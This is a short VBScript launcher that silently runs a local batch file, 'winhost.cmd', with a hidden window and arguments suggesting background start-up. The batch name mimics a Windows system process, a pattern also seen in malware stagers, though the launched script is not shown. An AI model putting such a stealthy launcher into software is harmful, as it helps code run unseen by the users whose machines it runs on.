Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & ".\winhost.cmd" & Chr(34) & " Background NoUI ShellStartUp", 0
Set WshShell = Nothing